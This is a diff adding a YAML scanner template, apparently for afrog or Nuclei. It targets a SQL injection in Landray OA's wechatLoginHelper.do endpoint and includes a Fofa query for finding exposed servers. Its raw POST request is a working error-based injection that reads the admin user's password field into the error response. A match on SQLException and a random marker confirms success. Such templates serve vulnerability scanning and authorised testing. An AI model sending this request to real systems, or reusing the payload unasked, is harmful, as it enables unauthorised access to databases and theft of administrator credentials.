@@ -1,0 +1,34 @@
+id: landray-wechat-loginhelper-sqli
+
+info:
+  name: 蓝凌OA wechatLoginHelper存在SQL注入
+  author: zan8in
+  severity: high
+  description: |-
+    Fofa: app="Landray-OA系统"
+  reference:
+    - https://mp.weixin.qq.com/s/vwJjmb_Im6Z7-2EVSfY5-g
+  tags: LandRay-OA
+
+variables:
+  randstr: "{{rand_text_alphanumeric(8)}}"
+
+http:
+  - raw:
+      - |
+        POST /third/wechat/wechatLoginHelper.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        method=edit&uid=1'and+(SELECT+fdPassword%2B'----{{randstr}}'+FROM+com.landray.kmss.sys.organization.model.SysOrgPerson+where+fdLoginName='admin')=1+and+'1'='1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "java.sql.SQLException"
+      - type: regex
+        regex:
+          - "{{randstr}}"
